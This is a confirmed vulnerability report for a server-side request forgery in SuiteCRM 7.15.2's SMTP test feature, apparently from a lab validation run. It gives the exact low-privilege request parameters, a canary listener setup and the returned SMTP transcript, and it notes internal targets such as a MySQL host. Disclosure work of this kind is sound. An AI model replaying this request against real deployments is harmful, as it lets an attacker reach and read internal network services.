# VULN-045 — SMTP "Test Settings" body-returning SSRF (arbitrary host:port + banner/transcript exfiltration)

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: High (CVSS 8.5)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28T20:17Z

## Preconditions
- `automation.py` creates a fresh **non-admin** SuiteCRM user via `_common.create_user()` (admin session used only for provisioning, matching the manifest's `create_user` primitive — the attacker path itself needs no admin).
- Starts a raw TCP listener on the host, `0.0.0.0:33119` (`OOB_BIND`/`OOB_PORT`), which on `accept()` immediately sends one line: `220 BANNER-LEAK-<random>  ESMTP ready\r\n` (mimics a server-speaks-first SMTP banner), then logs whatever the client sends back. Per `TARGET_FACTS.md`, the app container reaches this at `172.18.0.1:33119` (docker bridge gateway); `db:3306` is the alternative truly-internal target but MySQL's binary handshake breaks `json_encode()` on the response (see Research note below) so the OOB listener with a plain-ASCII banner is used as the primary, cleaner proof of the same mechanism.

## Request
See `request.http`. Key parameters (POST `/index.php`, low-priv session cookie):
```
module=Emails&action=EmailUIAjax&emailUIAction=testOutbound
&mail_smtpserver=172.18.0.1&mail_smtpport=33119&mail_smtpssl=0&mail_smtpauth_req=0
&outboundtest_from_address=<addr>
```
Header `X-Requested-With: XMLHttpRequest` set (matches the real UI's `YAHOO.util.Connect.asyncRequest` XHR).

## Response
See `response.txt`. Decisive fragment (`fullSmtpLog` field of the JSON body `EmailUIAjax.php` echoes):
```
3: Connection: opening to 172.18.0.1:33119, timeout=300, options=array()
3: Connection: opened
2: SERVER -> CLIENT: 220 BANNER-LEAK-smtp_a11d457b ESMTP ready\r\n
1: CLIENT -> SERVER: EHLO localhost\r\n
2: SERVER -> CLIENT:
1: SMTP ERROR: EHLO command failed:
1: SMTP NOTICE: EOF caught while checking if connected
3: Connection: closed
```
`evidence/oob_listener.log`:
```
listener bound 0.0.0.0:33119, banner='220 BANNER-LEAK-smtp_a11d457b ESMTP ready\r\n'
HIT from 172.18.0.3:47530: client sent b'EHLO localhost\r\n'
```
`172.18.0.3` is the app container's own IP inside the compose network (see `TARGET_FACTS.md`), confirming it was the SuiteCRM server — not the exploit script itself — that connected.

## Observation
Matches the static finding exactly: `sendEmailTest()` (`modules/Emails/Email.php:822-825`) assigns the raw request-controlled host/port to `SugarPHPMailer` with no `validate_external_host()` call, connects, and on failure returns the full `fullSmtpLog` transcript (`:859`) to the caller. The random canary planted in the OOB listener's banner round-trips through the server and back to the (network-unprivileged) HTTP client in the same response — i.e. this is not blind SSRF, it is full response/content disclosure of whatever a server-speaks-first service on the internal network says.

## Side effects
- New `users` row for the throwaway low-priv account (`mod_...`, random suffix) — harmless test fixture, left in place like other stage-10 fixtures.
- One inbound TCP connection to the host-bound OOB listener, logged in `evidence/oob_listener.log`.
- No other state change; `sendEmailTest()` does not persist anything.

## Research & references
- OWASP SSRF cheat sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger SSRF (blind vs non-blind, "SSRF with response returned"): https://portswigger.net/web-security/ssrf
- Technique used: classic "server-speaks-first" OOB banner reflection — plant a recognisable banner on a listener the attacker controls but the *attacker's HTTP client* cannot itself reach except through the vulnerable server, then assert the exact banner text comes back over the unrelated HTTP response channel.
- Non-fatal side-note for future runs against this sink: pointing `mail_smtpserver` at `db:3306` (MySQL) *does* provoke a real outbound connection (confirmed via `suitecrm.log`: `SugarPHPMailer encountered an error: SMTP Error: Could not connect to SMTP host.` at the matching timestamp, after the ~10s connect window), but MySQL's binary handshake packet contains non-UTF-8 bytes, and SuiteCRM's `getJSONobj()->encode()` silently returns an empty string for invalid-UTF-8 input — so the transcript never reaches the client in that specific case even though the SSRF connection itself still fires. This is a JSON-encoding side-effect of the *target* chosen, not a fix, and does not apply to text-protocol targets (SMTP, HTTP, FTP, Redis, etc.), which is why the OOB listener (plain ASCII banner) was used as the primary proof here.
